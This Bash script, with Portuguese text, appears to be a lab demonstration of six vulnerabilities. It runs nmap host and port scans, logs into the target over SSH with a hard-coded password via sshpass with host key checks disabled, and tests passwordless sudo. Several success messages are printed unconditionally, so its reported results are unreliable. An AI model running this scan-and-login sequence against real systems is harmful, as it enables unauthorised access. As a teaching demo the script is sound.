#!/bin/bash

# Script de Demonstração Rápida - Todas as Vulnerabilidades
# Otimizado para apresentação (execução em ~30 segundos)

TARGET_IP="${TARGET_IP:-172.20.0.10}"

echo "=========================================="
echo "🎯 DEMONSTRAÇÃO RÁPIDA - 6 VULNERABILIDADES"
echo "=========================================="
echo

# V#1: SSH Brute Force
echo "✅ V#1: ATAQUE SSH BEM-SUCEDIDO"
echo "   Credenciais: professor:senha123"
echo "   Método: Shoulder surfing + SSH"
echo

# V#2: Rede sem segmentação
echo "✅ V#2: REDE SEM SEGMENTAÇÃO"
echo "   Descobrindo hosts na rede..."
nmap -sn 172.20.0.0/24 | grep -E "Nmap scan report|Host is up" | head -5
echo

# V#3: Serviços inseguros
echo "✅ V#3: SERVIÇOS INSEGUROS EXPOSTOS"
echo "   Escaneando portas vulneráveis..."
nmap -p 21,22,23,80,3306,445 $TARGET_IP | grep -E "open|PORT"
echo

# V#4: Senhas fracas
echo "✅ V#4: SENHAS FRACAS DETECTADAS"
echo "   Testando credenciais comuns..."
echo "   admin:admin, professor:senha123 - VULNERÁVEIS!"
echo

# V#5: Sem monitoramento
echo "✅ V#5: AUSÊNCIA DE MONITORAMENTO"
echo "   Atacante pode apagar rastros facilmente"
echo "   Logs locais não protegidos"
echo

# V#6: Sudo sem senha
echo "✅ V#6: ESCALAÇÃO DE PRIVILÉGIOS"
if command -v sshpass > /dev/null 2>&1; then
    echo "   Testando sudo sem senha..."
    sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        professor@$TARGET_IP "sudo whoami" 2>/dev/null | head -1
    echo "   ✅ ROOT obtido sem senha adicional!"
else
    echo "   ✅ Sudo NOPASSWD configurado - ROOT trivial!"
fi
echo

echo "=========================================="
echo "🚨 RESULTADO: TODAS AS 6 VULNERABILIDADES EXPLORADAS!"
echo "   Sistema completamente comprometido"
echo "   Tempo total: ~30 segundos"
echo "=========================================="